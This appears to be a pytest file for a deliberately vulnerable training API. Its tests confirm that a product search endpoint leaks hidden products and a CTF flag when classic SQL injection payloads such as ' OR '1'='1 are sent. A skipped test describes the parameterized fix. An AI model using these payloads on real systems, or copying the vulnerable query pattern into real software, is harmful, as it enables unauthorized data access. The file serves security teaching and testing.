"""
V06 - SQL Injection
OWASP API8:2023 / CWE-89

Tests that verify SQL injection vulnerability exists in product search.
"""

import pytest
import urllib.parse


class TestSQLInjection:
    """Test cases for SQL Injection vulnerability."""

    def test_normal_search(self, client):
        """Normal search should work."""
        response = client.get("/api/products?search=laptop")

        assert response.status_code == 200
        products = response.json()
        assert len(products) >= 1
        assert any("laptop" in p["name"].lower() for p in products)

    def test_sqli_always_true(self, client):
        """
        VULNERABILITY: SQL injection with always-true condition.

        Payload: ' OR '1'='1
        """
        payload = "' OR '1'='1"
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")

        assert response.status_code == 200
        products = response.json()

        # VULNERABLE: Returns all products including hidden ones
        assert len(products) >= 5

    def test_sqli_find_hidden_product(self, client):
        """
        VULNERABILITY: SQL injection reveals hidden products with flag.
        """
        payload = "' OR '1'='1"
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")

        products = response.json()

        # Find the secret product
        secret_product = next(
            (p for p in products if p["name"] == "Secret Product"),
            None
        )

        assert secret_product is not None
        assert "VULNAPI{sqli_database_dumped}" in secret_product["description"]

    def test_sqli_bypass_active_filter(self, client):
        """
        VULNERABILITY: SQL injection bypasses is_active filter.
        """
        payload = "' OR is_active=0 OR '"
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")

        products = response.json()

        # Should find inactive products
        inactive = [p for p in products if not p.get("is_active", True)]
        assert len(inactive) >= 1

    def test_sqli_comment_injection(self, client):
        """
        VULNERABILITY: SQL injection with comment to truncate query.
        """
        payload = "' OR 1=1--"
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")

        # Should return results (SQLite handles -- comments)
        assert response.status_code == 200

    def test_sqli_extract_product_count(self, client):
        """
        Test that SQLi can be used to extract data.
        """
        # First, get count with normal query
        response = client.get("/api/products")
        normal_count = len(response.json())

        # With SQLi, should get more (including hidden)
        payload = "' OR '1'='1"
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")
        sqli_count = len(response.json())

        # SQLi returns more products
        assert sqli_count > normal_count

    def test_sqli_double_quote(self, client):
        """
        VULNERABILITY: Double quote injection.
        """
        payload = '" OR "1"="1'
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")

        # May or may not work depending on quote style
        assert response.status_code in [200, 500]


class TestSQLInjectionSecure:
    """These tests would pass with parameterized queries."""

    @pytest.mark.skip(reason="API is intentionally vulnerable")
    def test_sqli_blocked(self, client):
        """SQL injection payloads should not affect query."""
        payload = "' OR '1'='1"
        encoded = urllib.parse.quote(payload)
        response = client.get(f"/api/products?search={encoded}")

        # Should return empty results (literal search)
        products = response.json()
        assert len(products) == 0
